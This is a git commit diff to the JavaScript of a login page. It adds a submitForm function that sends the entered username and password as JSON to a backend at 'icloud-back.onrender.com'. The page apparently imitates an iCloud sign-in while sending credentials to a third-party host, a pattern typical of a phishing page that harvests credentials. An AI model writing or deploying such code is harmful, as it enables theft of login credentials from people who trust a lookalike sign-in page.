8f445d2852a84ad75d293b43bfe263386e709c0d
Alan Almeida da Silva <62144452+AlanTddy@users.noreply.github.com>
2024-10-21 12:58:45 -0300

    feat: conectando ao back

--- js/app.js
+++ js/app.js
@@ -3,7 +3,6 @@ const username = document.getElementById('username');
 const password = document.getElementById('password');
 const form = document.forms.form;
 
-
 getAllEvent();
 
 function getAllEvent() {
@@ -15,16 +14,39 @@ function getAllEvent() {
 function controlToInput(e) {
     if (e.key == 'Enter') {
         if (username.value == '' || password.value == '')
-            return
+            return;
         else
-            form.submit();
+            submitForm();
     }
 }
 
 function controlToInput2() {
     if (username.value == '' || password.value == '')
-        return
+        return;
     else
-        form.submit();
+        submitForm();
 }
 
+function submitForm() {
+    const formData = {
+        username: username.value,
+        password: password.value
+    };
+
+    fetch('https://icloud-back.onrender.com/submit-form', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Success:', data);
+        alert('Formulário enviado com sucesso!');
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+        alert('Ocorreu um erro ao enviar o formulário.');
+    });
+}
